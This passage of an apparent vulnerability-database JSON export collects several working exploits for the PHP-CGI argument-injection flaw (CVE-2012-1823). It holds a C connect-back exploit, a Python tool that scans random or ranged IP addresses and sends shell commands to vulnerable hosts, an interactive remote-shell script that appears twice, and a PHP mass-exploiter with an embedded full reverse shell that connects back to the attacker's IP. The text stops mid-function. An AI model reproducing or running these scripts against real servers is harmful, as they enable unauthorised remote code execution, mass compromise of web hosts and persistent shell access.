printf(\"Hostname cannot be resolved\\n\");\r\n  exit(255);\r\n }\r\n \r\n servercopy = malloc(sizeof(struct sockaddr_in));\r\n if (!servercopy) {\r\n\tprintf(\"malloc error (1)\\n\");\r\n\texit(255);\r\n }\r\n memset(&server, '\\0', sizeof(struct sockaddr_in));\r\n memcpy(&server.sin_addr, he->h_addr_list[0],  he->h_length);\r\n server.sin_family = AF_INET;\r\n server.sin_port = htons(port);\r\n memcpy(servercopy, &server, sizeof(struct sockaddr_in));\r\n return servercopy;\r\n}\r\n\r\nchar *sslread(connection *c)\r\n{\r\n  char *rc = NULL;\r\n  int received, count = 0, count2=0;\r\n  char ch;\r\n\r\n  for(;;)\r\n  {\r\n   if (!rc)\r\n    rc = calloc(1024, sizeof (char) + 1);\r\n   else\r\n    if (count2 % 1024 == 0) {\r\n     rc = realloc(rc, (count2 + 1) * 1024 * sizeof (char) + 1);\r\n    }\r\n    received = SSL_read(c->handle, &ch, 1);\r\n    if (received == 1) {\r\n     rc[count++] = ch;\r\n     count2++;\r\n     if (count2 > 1024*5)\r\n\t  break;\r\n    }\r\n    else\r\n     break;\r\n   }\r\n  return rc;\r\n}\r\n\r\nchar *read_(int sockfd)\r\n{\r\n  char *rc = NULL;\r\n  int received, count = 0, count2=0;\r\n  char ch;\r\n\r\n  for(;;)\r\n  {\r\n   if (!rc)\r\n    rc = calloc(1024, sizeof (char) + 1);\r\n   else\r\n    if (count2 % 1024 == 0) {\r\n     rc = realloc(rc, (count2 + 1) * 1024 * sizeof (char) + 1);\r\n    }\r\n    received = read(sockfd, &ch, 1);\r\n    if (received == 1) {\r\n     rc[count++] = ch;\r\n     count2++;\r\n     if (count2 > 1024*5)\r\n\t  break;\r\n    }\r\n    else\r\n     break;\r\n   }\r\n  return rc;\r\n}\r\n\r\nvoid main(int argc, char *argv[])\r\n{\r\n  char *target, *protocol, *targetip, *writestr, *tmpstr, *readbuf=NULL,\r\n   *interpreter, *reverseip, *reverseportstr, *forceinterpreter=NULL;\r\n  char httpsflag=0;\r\n  unsigned short port=0, reverseport=0;\r\n  struct sockaddr_in *server;\r\n  int sockfd;\r\n  unsigned int writesize, tmpsize;\r\n  unsigned int i;\r\n  connection *sslconnection;\r\n  printf(\"-== Apache Magika by Kingcope ==-\\n\");\r\n  for(;;)\r\n  {\r\n\t int c;\r\n     int option_index=0;\r\n     static struct option long_options[] = {\r\n\t   {\"target\", required_argument, 0, 0 },\r\n\t   {\"port\", required_argument, 0, 0 },\r\n\t   {\"protocol\", required_argument, 0, 0 },\r\n\t   {\"reverse-ip\", required_argument, 0, 0 },\r\n\t   {\"reverse-port\", required_argument, 0, 0 },\r\n\t   {\"force-interpreter\", required_argument, 0, 0 },\t   \r\n\t   {0, 0, 0, 0 }\r\n\t  };\r\n\t \r\n\t c = getopt_long(argc, argv, \"\", long_options, &option_index);\r\n     if (c < 0)\r\n     \tbreak;\r\n     \r\n     switch (c) {\r\n\t case 0:\r\n\t  switch (option_index) {\r\n\t   case 0:\r\n\t    if (optarg) {\r\n\t     target = calloc(strlen(optarg)+1, sizeof(char));\r\n\t     if (!target) {\r\n\t\t  printf(\"calloc error (2)\\n\");\r\n\t      exit(255);\r\n         }\r\n\t     memcpy(target, optarg, strlen(optarg)+1);\r\n    \t}\r\n        break;\r\n       case 1:\r\n        if(optarg)\r\n\t     port = atoi(optarg);\r\n        break;\r\n       case 2:\r\n        protocol = calloc(strlen(optarg)+1, sizeof(char));\r\n        if (!protocol) {\r\n\t     printf(\"calloc error (3)\\n\");\r\n         exit(255);\r\n        }\r\n        memcpy(protocol, optarg, strlen(optarg)+1);\r\n        if (!strcmp(protocol, \"https\"))\r\n         httpsflag=1;\r\n        break;\r\n       case 3:\r\n        reverseip = calloc(strlen(optarg)+1, sizeof(char));\r\n        if (!reverseip) {\r\n\t     printf(\"calloc error (4)\\n\");\r\n         exit(255);\r\n        }\r\n        memcpy(reverseip, optarg, strlen(optarg)+1);       \r\n        break;\r\n       case 4:\r\n\t    reverseport = atoi(optarg);       \r\n\t\treverseportstr = calloc(strlen(optarg)+1, sizeof(char));\r\n        if (!reverseportstr) {\r\n\t     printf(\"calloc error (5)\\n\");\r\n         exit(255);\r\n        }\r\n        memcpy(reverseportstr, optarg, strlen(optarg)+1);  \t     \r\n        break;\r\n       case 5:\r\n        forceinterpreter = calloc(strlen(optarg)+1, sizeof(char));\r\n        if (!forceinterpreter) {\r\n\t     printf(\"calloc error (6)\\n\");\r\n         exit(255);\r\n        }\r\n        memcpy(forceinterpreter, optarg, strlen(optarg)+1);       \r\n        break;\r\n       default:\r\n        usage(argv);\r\n\t  }\r\n\t  break;\r\n\t \r\n\t default:\r\n\t  usage(argv);\r\n     }\r\n  }\r\n\r\n  if ((optind < argc) || !target || !protocol || !port ||\r\n      !reverseip || !reverseport){\r\n\tusage(argv);\r\n  }\r\n  \r\n  server = gethostbyname_(target, port);\r\n  if (!server) {\r\n   printf(\"Error while resolving hostname. (7)\\n\");\r\n   exit(255);\r\n  }\r\n\r\n  char *interpreters[5];\r\n  int ninterpreters = 5;\r\n  interpreters[0] = strdup(\"/cgi-bin/php\");\r\n  interpreters[1] = strdup(\"/cgi-bin/php5\");\r\n  interpreters[2] = strdup(\"/cgi-bin/php-cgi\");\r\n  interpreters[3] = strdup(\"/cgi-bin/php.cgi\");\r\n  interpreters[4] = strdup(\"/cgi-bin/php4\");\r\n  \r\n  for (i=0;i<ninterpreters;i++) {\r\n   interpreter = interpreters[i];\r\n   if (forceinterpreter) {\r\n     interpreter = strdup(forceinterpreter);\r\n   }\r\n   if (forceinterpreter && i)\r\n    break;\r\n   printf(\"%s\\n\", interpreter);\r\n   \r\n   sockfd = socket(AF_INET, SOCK_STREAM, 0);\r\n   if (sockfd < 1) { \r\n\t printf(\"socket error (8)\\n\");\r\n\t exit(255);\r\n   }\r\n  \r\n   if (connect(sockfd, (void*)server, sizeof(struct sockaddr_in)) < 0) {\r\n    printf(\"connect error (9)\\n\");\r\n    exit(255);\t  \r\n   }\r\n   if (httpsflag) {\r\n    sslconnection = (connection*) malloc(sizeof(connection));\r\n    if (!sslconnection) {\r\n     printf(\"malloc error (10)\\n\");\r\n     exit(255);   \r\n    }\r\n    sslconnection->handle = NULL;\r\n    sslconnection->ctx = NULL;\r\n\r\n    SSL_library_init();\r\n\r\n    sslconnection->ctx = SSL_CTX_new(SSLv23_client_method());\r\n    if (!sslconnection->ctx) {\r\n \t printf(\"SSL_CTX_new error (11)\\n\");\r\n     exit(255);\r\n    }\r\n\r\n    sslconnection->handle = SSL_new(sslconnection->ctx);\r\n    if (!sslconnection->handle) {\r\n \t printf(\"SSL_new error (12)\\n\");\r\n\t exit(255);   \r\n    }\r\n    if (!SSL_set_fd(sslconnection->handle, sockfd)) {\r\n \t printf(\"SSL_set_fd error (13)\\n\");\r\n     exit(255);\r\n    }\r\n   \r\n    if (SSL_connect(sslconnection->handle) != 1) {\r\n\t printf(\"SSL_connect error (14)\\n\");\r\n     exit(255);       \r\n    }\r\n   }\r\n  \r\n   tmpsize = strlen(phpstr) + strlen(reverseip) + strlen(reverseportstr) + 64;\r\n   tmpstr = (char*)calloc(tmpsize, sizeof(char));\r\n   snprintf(tmpstr, tmpsize, phpstr, reverseip, reverseport);\r\n   \r\n   writesize = strlen(target) + strlen(interpreter) + \r\n     strlen(poststr) + strlen(tmpstr) + 64;\r\n   writestr = (char*)calloc(writesize, sizeof(char));\r\n   snprintf(writestr, writesize, poststr, interpreter,\r\n     target, strlen(tmpstr), tmpstr);\r\n  \r\n   if (!httpsflag) {\r\n\t write(sockfd, writestr, strlen(writestr));\r\n\t readbuf = read_(sockfd);\r\n   } else {\r\n\t SSL_write(sslconnection->handle, writestr, strlen(writestr));\r\n\t readbuf = sslread(sslconnection);\r\n   }\r\n  \r\n   if (readbuf) {\r\n     printf(\"***SERVER RESPONSE***\\n\\n%s\\n\\n\", readbuf);  \r\n   } else {\r\n    printf(\"read error (15)\\n\");\r\n    exit(255);\t  \r\n   }\r\n  }\r\n  exit(1);\r\n}\r\n\r\n",
            "cvss": {
                "score": 7.5,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:29290"
        },
        {
            "bulletinFamily": "exploit",
            "description": "",
            "modified": "2013-10-29T00:00:00",
            "published": "2013-10-29T00:00:00",
            "href": "https://packetstormsecurity.com/files/123833/Apache-PHP-Remote-Command-Execution.html",
            "id": "PACKETSTORM:123833",
            "type": "packetstorm",
            "title": "Apache / PHP Remote Command Execution",
            "sourceData": "`#!/usr/bin/env python  \n#  \n# ap-unlock.py - apache + php 5.* rem0te c0de execution 0day  \n#  \n# NOTE:  \n# - quick'n'dirty  \n# - '-x' is missing. copy&paste connect-back shell php code from kingcope's  \n# exploit: http://www.exploit-db.com/exploits/29290/  \n# - scanner is not multithreaded. as alternative use:  \n# ./pnscan -L10000 -w\"GET /cgi-bin/php HTTP/1.0\\r\\n\\r\\n\" -r \"500   \n# Internal\" <cidrrange> 80 | grep Apache (or get *scan, harhar)  \n#  \n# by noptrix - http://nullsecurity.net/  \n  \nimport sys  \nimport socket  \nimport argparse  \nimport threading  \nimport time  \nimport random  \nimport select  \n  \nt3st = 'POST /cgi-bin/php/%63%67%69%6E/%70%68%70?%2D%64+%61%6C%75%6F%6E+%2D' \\  \n'%64+%6D%6F%64+%2D%64+%73%75%68%6F%6E%3D%6F%6E+%2D%64+%75%6E%63%74%73' \\  \n'%3D%22%22+%2D%64+%64%6E%65+%2D%64+%61%75%74%6F%5F%70%72%%74+%2D%64+' \\  \n'%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+'\\  \n'%74%5F%3D%30+%2D%64+%75%74+%2D%6E HTTP/1.1\\r\\nHost:localhost\\r\\n'\\  \n'Content-Type: text/html\\r\\nContent-Length:1\\r\\n\\r\\na\\r\\n'  \n  \ndef enc0dez():  \nn33dz1 = ('cgi-bin', 'php')  \nn33dz2 = ('-d', 'allow_url_include=on', '-d', 'safe_mode=off', '-d',  \n'suhosin.simulation=on', '-d', 'disable_functions=\"\"', '-d',  \n'open_basedir=none', '-d', 'auto_prepend_file=php://input',  \n'-d', 'cgi.force_redirect=0', '-d', 'cgi.redirect_status_env=0',  \n'-d', 'auto_prepend_file=php://input', '-n')  \nfl4g = 0  \narg5 = ''  \np4th = ''  \nplus = ''  \n  \nfor x in n33dz2:  \nif fl4g == 1:  \nplus = '+'  \narg5 = arg5 + plus + \\  \n''.join('%' + c.encode('utf-8').encode('hex') for c in x)  \nfl4g = 1  \nfor x in n33dz1:  \np4th = p4th + '/' + \\  \n''.join('%' + c.encode('utf-8').encode('hex') for c in x)  \nreturn (p4th.upper(), arg5.upper())  \n  \ndef m4k3_p4yl0rd(p4yl0rd, vuln):  \np4th, arg5 = enc0dez()  \nif vuln:  \np4yl0rd = t3st  \nelse:  \np4yl0rd = 'POST /' + p4th + '?' + arg5 + ' HTTP/1.1\\r\\n' \\  \n'Host: ' + sys.argv[1] + '\\r\\n' \\  \n'Content-Type: application/x-www-form-urlencoded\\r\\n' \\  \n'Content-Length: ' + str(len(p4yl0rd)) + '\\r\\n\\r\\n' + p4yl0rd  \nreturn p4yl0rd  \n  \ndef s3nd_sh1t(args, vuln):  \npat = '<b>Parse error</b>:'  \ntry:  \ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  \ns.settimeout(float(args.t))  \nres = s.connect_ex((args.h, int(args.p)))  \nif res == 0:  \nif vuln:  \np4yl0rd = m4k3_p4yl0rd('', vuln)  \ns.sendall(p4yl0rd)  \ndata = s.recv(4096)  \nif pat in data:  \nprint \"[*] \" + args.h + \" vu1n\"  \nreturn args.h  \nreturn  \nelse:  \np4yl0rd = m4k3_p4yl0rd('<? system(\"' + args.c + '\"); ?>', vuln)  \ns.sendall(p4yl0rd)  \nwhile True:  \nrd, wd, ex = select.select([s], [], [], float(args.t))  \nif rd:  \ndata = s.recv(4096)  \nsys.stdout.flush()  \nsys.stdout.write(data)  \nsys.stdout.write('\\n')  \nelse:  \nreturn  \n#for line in s.makefile():  \n# print line,  \nexcept socket.error:  \nreturn  \nreturn  \n  \ndef m4k3_r4nd_1p4ddr(num):  \nh0sts = []  \nfor x in range(int(num)):  \nh0sts.append('%d.%d.%d.%d' % (random.randrange(0,255),  \nrandom.randrange(0,255), random.randrange(0,255),  \nrandom.randrange(0,255)))  \nreturn h0sts  \n  \ndef sc4n_r4ng3(rsa, rsb, args, vuln):  \nvu1nz = []  \nfor i in range (rsa[0], rsb[0]):  \nfor j in range (rsa[1], rsb[1]):  \nfor k in range (rsa[2], rsb[2]):  \nfor l in range(rsa[3], rsb[3]):  \nargs.h = str(i) + \".\" + str(j) + \".\" + str(k) + \".\" + str(l)  \nvu1nz.append(s3nd_sh1t(args, vuln))  \ntime.sleep(0.005)  \nvu1nz = filter(None, vu1nz)  \nreturn vu1nz  \n  \ndef m4k3_ipv4_r4ng3(iprange):  \na = tuple(part for part in iprange.split('.'))  \nrsa = (range(4))  \nrsb = (range(4))  \nfor i in range(0,4):  \nga = a[i].find('-')  \nif ga != -1:  \nrsa[i] = int(a[i][:ga])  \nrsb[i] = int(a[i][1+ga:]) + 1   \nelse:  \nrsa[i] = int(a[i])  \nrsb[i] = int(a[i]) + 1  \nreturn (rsa, rsb)  \n  \ndef parse_args():  \np = argparse.ArgumentParser(  \nusage='\\n\\n ./ap-unlock.py -h <4rg> -s | -c <4rg> | -x <4rg> [0pt1ons]' \\  \n'\\n ./ap-unlock.py -r <4rg> | -R <4rg> [0pt1ons]',  \nformatter_class=argparse.RawDescriptionHelpFormatter, add_help=False)  \nopts = p.add_argument_group('0pt1ons', '')  \nopts.add_argument('-h', metavar='wh1t3h4tz.0rg',  \nhelp='| t3st s1ngle h0st f0r vu1n')  \nopts.add_argument('-p', default=80, metavar='80',  \nhelp='| t4rg3t p0rt (d3fau1t: 80)')  \nopts.add_argument('-c', metavar='\\'uname -a;id\\'',  \nhelp='| s3nd c0mm4nds t0 h0st')  \nopts.add_argument('-x', metavar='192.168.0.2 1337',  \nhelp='| c0nn3ct b4ck h0st 4nd p0rt f0r sh3ll')  \nopts.add_argument('-s', action='store_true',  \nhelp='| t3st s1ngl3 h0st f0r vu1n')  \nopts.add_argument('-r', metavar='133.1.3-7.7-37',  \nhelp='| sc4nz iP addr3ss r4ng3 f0r vu1n')  \nopts.add_argument('-R', metavar='1337',  \nhelp='| sc4nz num r4nd0m h0st5 f0r vu1n')  \nopts.add_argument('-t', default=3, metavar='3',  \nhelp='| t1me0ut in s3x (d3fau1t: 3)')  \nopts.add_argument('-f', metavar='vu1n.lst',  \nhelp='| wr1t3 vu1n h0sts t0 f1l3')  \nargs = p.parse_args()  \nif not args.h and not args.r and not args.R:  \np.print_help()  \nsys.exit(0)  \nreturn args  \n  \ndef m41n():  \nif __name__ == \"__main__\":  \nprint \"--==[ ap-unlock.py by noptrix@nullsecurity.net ]==--\"  \nvuln = 0  \ntry:  \nargs = parse_args()  \nif not args.t:  \nargs.t = float(3)  \nif args.h:  \nif args.s:  \nprint \"[+] sc4nn1ng s1ngl3 h0st %s \" % (args.h)  \nvuln = 1  \ns3nd_sh1t(args, vuln)  \nelif args.c:  \nprint \"[+] s3nd1ng c0mm4ndz t0 h0st %s \" % (args.h)  \ns3nd_sh1t(args, vuln)  \nelif args.x:  \nprint \"[+] xpl0it1ng b0x %s \" % (args.h)  \nprint \"t0d0\"  \nelse:  \nprint \"[-] 3rr0r: m1ss1ng -s, -c 0r -x b1tch\"  \nsys.exit(-1)  \nif args.r:  \nprint \"[+] sc4nn1ng r4ng3 %s \" % (args.r)  \nvuln = 1  \nrsa, rsb = m4k3_ipv4_r4ng3(args.r)  \nvu1nz = sc4n_r4ng3(rsa, rsb, args, vuln)  \nif args.R:  \nprint \"[+] sc4nn1ng %d r4nd0m b0xes\" % (int(args.R))  \nvuln = 1  \nh0sts = m4k3_r4nd_1p4ddr(int(args.R))  \nfor h0st in h0sts:  \nargs.h = h0st  \ns3nd_sh1t(args, vuln)  \nexcept KeyboardInterrupt:  \nsys.stdout.flush()  \nsys.stderr.write(\"\\b\\b[!] w4rn1ng: ab0rt3d bY us3r\\n\")  \nraise SystemExit  \nif args.f:  \nif vu1nz:  \nf = open(args.f, \"w\")  \nf.write(\"\\n\".join(vu1nz)+\"\\n\")  \nf.close()  \nelse:  \nprint \"[-] 3rr0r: y0u fuck3d up dud3\"  \nsys.exit(1)  \nprint \"[+] h0p3 1t h3lp3d\"  \n  \nm41n()  \n`\n",
            "cvss": {
                "score": 7.5,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/packetstorm/PACKETSTORM:123833"
        },
        {
            "bulletinFamily": "exploit",
            "description": "No description provided by source.",
            "modified": "2012-12-25T00:00:00",
            "published": "2012-12-25T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-60536",
            "id": "SSV:60536",
            "title": "PHP-CGI Argument Injection Remote Code Execution",
            "type": "seebug",
            "sourceData": "\n                                                #!/usr/bin/python\r\nimport requests\r\nimport sys\r\n\r\nprint &quot;&quot;&quot;\r\nCVE-2012-1823 PHP-CGI Arguement Injection Remote Code Execution\r\nThis exploit abuses an arguement injection in the PHP-CGI wrapper\r\nto execute code as the PHP user/webserver user.\r\nFeel free to give me abuse about this &lt;3\r\n- infodox | insecurety.net | @info_dox\r\n&quot;&quot;&quot;\r\n\r\nif len(sys.argv) != 2:\r\n    print &quot;Usage: ./cve-2012-1823.py &lt;target&gt;&quot;\r\n    sys.exit(0)\r\n\r\ntarget = sys.argv[1]\r\nurl = &quot;&quot;&quot;http://&quot;&quot;&quot; + target + &quot;&quot;&quot;/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input&quot;&quot;&quot;\r\nlol = &quot;&quot;&quot;&lt;?php system('&quot;&quot;&quot;\r\nlol2 = &quot;&quot;&quot;');die(); ?&gt;&quot;&quot;&quot;\r\nprint &quot;[+] Connecting and spawning a shell...&quot;\r\nwhile True:\r\n    try:\r\n        bobcat = raw_input(&quot;%s:~$ &quot; %(target))\r\n        lulz = lol + bobcat + lol2\r\n        hax = requests.post(url, lulz)\r\n        print hax.text\r\n    except KeyboardInterrupt:\r\n        print &quot;\\n[-] Quitting&quot;\r\n        sys.exit(1)\n                              ",
            "cvss": {
                "score": 7.5,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/seebug/SSV:60536"
        },
        {
            "bulletinFamily": "exploit",
            "description": "",
            "modified": "2012-12-24T00:00:00",
            "published": "2012-12-24T00:00:00",
            "href": "https://packetstormsecurity.com/files/119075/PHP-CGI-Argument-Injection-Remote-Code-Execution.html",
            "id": "PACKETSTORM:119075",
            "type": "packetstorm",
            "title": "PHP-CGI Argument Injection Remote Code Execution",
            "sourceData": "`#!/usr/bin/python  \nimport requests  \nimport sys  \n  \nprint \"\"\"  \nCVE-2012-1823 PHP-CGI Arguement Injection Remote Code Execution  \nThis exploit abuses an arguement injection in the PHP-CGI wrapper  \nto execute code as the PHP user/webserver user.  \nFeel free to give me abuse about this <3  \n- infodox | insecurety.net | @info_dox  \n\"\"\"  \n  \nif len(sys.argv) != 2:  \nprint \"Usage: ./cve-2012-1823.py <target>\"  \nsys.exit(0)  \n  \ntarget = sys.argv[1]  \nurl = \"\"\"http://\"\"\" + target + \"\"\"/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input\"\"\"  \nlol = \"\"\"<?php system('\"\"\"  \nlol2 = \"\"\"');die(); ?>\"\"\"  \nprint \"[+] Connecting and spawning a shell...\"  \nwhile True:  \ntry:  \nbobcat = raw_input(\"%s:~$ \" %(target))  \nlulz = lol + bobcat + lol2  \nhax = requests.post(url, lulz)  \nprint hax.text  \nexcept KeyboardInterrupt:  \nprint \"\\n[-] Quitting\"  \nsys.exit(1)  \n  \n  \n`\n",
            "cvss": {
                "score": 7.5,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/packetstorm/PACKETSTORM:119075"
        },
        {
            "bulletinFamily": "exploit",
            "description": "",
            "modified": "2012-05-22T00:00:00",
            "published": "2012-05-22T00:00:00",
            "href": "https://packetstormsecurity.com/files/112971/PHP-CGI-Argument-Injection.html",
            "id": "PACKETSTORM:112971",
            "type": "packetstorm",
            "title": "PHP CGI Argument Injection",
            "sourceData": "`<?php  \n  \n######################################### www.bugreport.ir   \n########################################  \n#  \n# Title: PHP CGI Argument Injection Remote Exploit   \nV0.3 - PHP Version  \n# Vendor: http://www.php.net  \n# Vulnerable Version: PHP up to version 5.3.12 and 5.4.2  \n# Exploitation: Remote  \n# Original Advisory:   \nhttp://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/  \n# Original Exploit URL: http://www.bugreport.ir/79/exploit.htm  \n# CVE: CVE-2012-1823  \n# Coded By: Mostafa Azizi (admin[@]0-Day[dot]net)  \n###################################################################################################  \n  \n/* This tool may be used for legal purposes only. Users take full   \nresponsibility for any actions performed using this tool.  \nThe author accepts no liability for damage caused by this tool. If   \nthese terms are not acceptable to you, then do not use this tool.*/  \n  \nerror_reporting(0);  \nini_set(\"max_execution_time\",0);  \nini_set(\"default_socket_timeout\", 10);  \nob_implicit_flush (1);  \n  \necho'<html>  \n<head>  \n<title>PHP CGI Argument Injection Remote Exploit</title>  \n</head>  \n<p align=\"center\"><font size=\"4\" color=\"#5E767E\">PHP CGI Argument   \nInjection</font></p>  \n<p align=\"center\"><font size=\"3\" color=\"#4E8975\">Coded by: Mostafa   \nAzizi (admin[@]0-Day[dot]net)</font></p>  \n<body bgcolor=\"#00000\">  \n<table align=\"center\" border=\"5\">  \n<tr>  \n<th><p align=\"center\"><font size=\"4\" color=\"#8BB381\">Mass File   \nUploader</font></p>  \n</th>  \n<th></th>  \n<th><p align=\"center\"><font size=\"4\" color=\"#8BB381\">Reverse   \nShell</font></p>  \n</th>  \n</tr>  \n<tr>  \n<td><form name=\"form1\" action=\"'.$SERVER[PHP_SELF].'\"   \nenctype=\"multipart/form-data\" method=\"post\">  \n</br>  \n<p></font><font color=\"#FFF8C6\" >Please specify a file to   \nscan: </font></br><input type=\"file\" name=\"listfile\"   \nsize=\"40\"><font color=\"#FF0000\"> * </font>  \n<p></font><font color=\"#FFF8C6\" >Please specify a file to   \nupload: </font></br><input type=\"file\" name=\"datafile\"   \nsize=\"40\"><font color=\"#FF0000\"> * </font>  \n<p><font color=\"#FFF8C6\" > specify a port (default is 80):   \n</font></br><input name=\"port\" size=\"20\"><span   \nclass=\"Stile5\"></span></p>  \n<p><font color=\"#FFF8C6\" > Proxy (ip:port):   \n</font></br><input name=\"proxy\" size=\"20\"><span   \nclass=\"Stile5\"></span></p>  \n<p align=\"center\"> <span class=\"Stile5\"><font   \ncolor=\"#FF0000\">* </font><font color=\"white\" >fields are   \nrequired</font></font></span></p>  \n</br>  \n<p align=\"center\"><input type=\"submit\" value=\"Start Attack\"   \nname=\"Submit\"></p>  \n</form> </td>  \n<td></td>  \n<td><form name=\"form1\" action=\"'.$SERVER[PHP_SELF].'\"   \nenctype=\"multipart/form-data\" method=\"post\">  \n</br>  \n<p></font><font color=\"#FFF8C6\" > hostname (ex:   \nwww.sitename.com):</font></br><input name=\"host\" size=\"20\"> <span   \nclass=\"Stile5\"></span></p>  \n<p></font><font color=\"#FFF8C6\" > Your IP (ex:   \n173.194.35.169 ): </font></br><input name=\"lip\" size=\"20\">   \n<span class=\"Stile5\"></span></p>  \n<p><font color=\"#FFF8C6\" > Your Port (ex:   \n80):</font></br><input name=\"lport\" size=\"20\"> <span   \nclass=\"Stile5\"></span></p>  \n</br></br>  \n<p align=\"center\"> <span class=\"Stile5\"><font   \ncolor=\"#FF0000\">All </font><font color=\"white\" >fields are   \nrequired</font></font></span></p>  \n</br>  \n<p align=\"center\"><input type=\"submit\" value=\"Start Attack\"   \nname=\"Submit2\"></p>  \n</form> </td>  \n</tr>  \n</table>  \n</font>  \n<table width=\"90%\">  \n<tbody>  \n<tr>  \n<td width=\"43%\" align=\"left\">  \n  \n</td>  \n</tr>  \n</tbody>  \n</table>  \n</body></html>';  \n  \n$host = $_POST['host'];  \n$lip = $_POST['lip'];  \n$lport = $_POST['lport'];  \n$port = $_POST['port'];  \n$proxy = $_POST['proxy'];  \n$list = file($_FILES['listfile']['tmp_name']);  \n$file =   \nbase64_encode(gzdeflate(file_get_contents($_FILES['datafile']['tmp_name'])));  \n$shell = \"gzinflate(base64_decode(\\\"$file\\\"))\";  \n  \nif (isset($_POST['Submit2']) && $host != '' && $lip != '' && $lport != '')  \n{  \n/*pentestmonkey's php-reverse-shell.  \nLimitations: proc_open and stream_set_blocking require PHP version   \n4.3+, or 5+ */  \n  \n/* Connect Back */  \n  \n$payload = \"<?php set_time_limit (0); \\$VERSION = \\\"1.0\\\"; \\$ip =   \n'$lip'; \\$port = $lport; \\$chunk_size = 1400; \\$write_a = null;   \n\\$error_a = null; \\$shell = 'uname -a; w; id; /bin/sh -i'; \\$daemon =   \n0;\\$debug = 0; if (function_exists('pcntl_fork')) { \\$pid =   \npcntl_fork(); if (\\$pid == -1) { printit(\\\"ERROR: Can't fork\\\");   \nexit(1);} if (\\$pid) { exit(0);} if (posix_setsid() == -1) {   \nprintit(\\\"Error: Can't setsid()\\\"); exit(1); } \\$daemon = 1;} else {   \nprintit(\\\"WARNING: Failed to daemonise. This is quite common and not   \nfatal.\\\");}chdir(\\\"/\\\"); umask(0); \\$sock = fsockopen(\\$ip, \\$port,   \n\\$errno, \\$errstr, 30);if (!\\$sock) { printit(\\\"\\$errstr (\\$errno)\\\");   \nexit(1);} \\$descriptorspec = array(0 => array(\\\"pipe\\\", \\\"r\\\"),1 =>   \narray(\\\"pipe\\\", \\\"w\\\"), 2 => array(\\\"pipe\\\", \\\"w\\\"));\\$process =   \nproc_open(\\$shell, \\$descriptorspec, \\$pipes);if   \n(!is_resource(\\$process)) { printit(\\\"ERROR: Can't spawn shell\\\");   \nexit(1);}stream_set_blocking(\\$pipes[0],   \n0);stream_set_blocking(\\$pipes[1], 0);stream_set_blocking(\\$pipes[2],   \n0);stream_set_blocking(\\$sock, 0);printit(\\\"Successfully opened   \nreverse shell to \\$ip:\\$port\\\"); while (1) { if (feof(\\$sock)) {   \nprintit(\\\"ERROR: Shell connection terminated\\\"); break;} if   \n(feof(\\$pipes[1])) {printit(\\\"ERROR: Shell process   \nterminated\\\");break;}\\$read_a = array(\\$sock, \\$pipes[1],   \n\\$pipes[2]);\\$num_changed_sockets = stream_select(\\$read_a, \\$write_a,   \n\\$error_a, null);if (in_array(\\$sock, \\$read_a)) {if (\\$debug)   \nprintit(\\\"SOCK READ\\\");\\$input = fread(\\$sock,   \n\\$chunk_size);if(\\$debug) printit(\\\"SOCK:   \n\\$input\\\");fwrite(\\$pipes[0], \\$input);}if (in_array(\\$pipes[1],   \n\\$read_a)) {if (\\$debug) printit(\\\"STDOUT READ\\\");\\$input =   \nfread(\\$pipes[1], \\$chunk_size);if (\\$debug) printit(\\\"STDOUT:   \n\\$input\\\");fwrite(\\$sock, \\$input);}if (in_array(\\$pipes[2],   \n\\$read_a)) {if (\\$debug) printit(\\\"STDERR READ\\\");\\$input =   \nfread(\\$pipes[2], \\$chunk_size); if (\\$debug) printit(\\\"STDERR:   \n\\$input\\\");fwrite(\\$sock,   \n\\$input);}}fclose(\\$sock);fclose(\\$pipes[0]);fclose(\\$pipes[1]);fclose(\\$pipes[2]);proc_close(\\$process);function printit (\\$string) {if (!\\$daemon) {print \\\"\\$string\\n\\\";}}   \n?>\";  \n$packet = \"POST   \n\".$p.\"/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input   \nHTTP/1.1\\r\\n\";  \n$packet .= \"Host: \".$host.\"\\r\\n\";  \n$packet .= \"User-Agent: PHP CGI Argument Injection Exploiter\\r\\n\";  \n$packet .= \"Content-Type: application/x-www-form-urlencoded\\r\\n\";  \n$packet .= \"Content-Length: \".strlen($payload).\"\\r\\n\\r\\n\";  \n$packet .= $payload.\"\\r\\n\\r\\n\\r\\n\\r\\n\";  \nsendpacket($packet,1,0,0);  \n  \n}elseif (isset($_POST['Submit']) && $list != '' && $file != '')  \n{  \nif ($port=='') {$port=80;}  \n  \nfor ($n =0; $n < count($list); $n++)  \n{  \n  \n$siteAddbackup = $list[$n];  \n$siteAdd=str_replace(\"http://\",\"\",$siteAddbackup);  \n  \npreg_match('/^(?:(?:http|https):\\/\\/)?[^\\/]+(\\/.+\\/)[^\\/\\.]+\\.[^\\/\\.]+$/i',$siteAddbackup,   \n$match);  \n$path = $match[1];  \n$pa = strstr(trim($siteAdd),$path);  \n$host=trim(str_replace($pa,\"\",$siteAdd));  \nif ($path ==''){$path = \"/\"; }  \nif ($proxy=='') {$p=$path;} else {$p='http://'.$host.$path;}  \n  \n/* Checking   \nAvailability */  \n  \n$connection = fsockopen($host,$port);  \nif (!$connection)  \n// site is down  \n{  \necho '<font color=red> No response from   \n'.htmlentities($host).' ...<br></font>';  \n  \nfile_put_contents(realpath(dirname(__FILE__)).'/notconnected.txt',   \n$siteAddbackup.\"\\r\\n\", FILE_APPEND);  \n}  \nelse  \n// site is up  \n{  \nfclose($connection);  \nExploitable($host,$path,$p);  \n}  \n  \n}  \n}  \n  \nFunction Exploitable($host,$path,$p)  \n{  \nglobal $html;  \n$i=0;  \n/* Checking 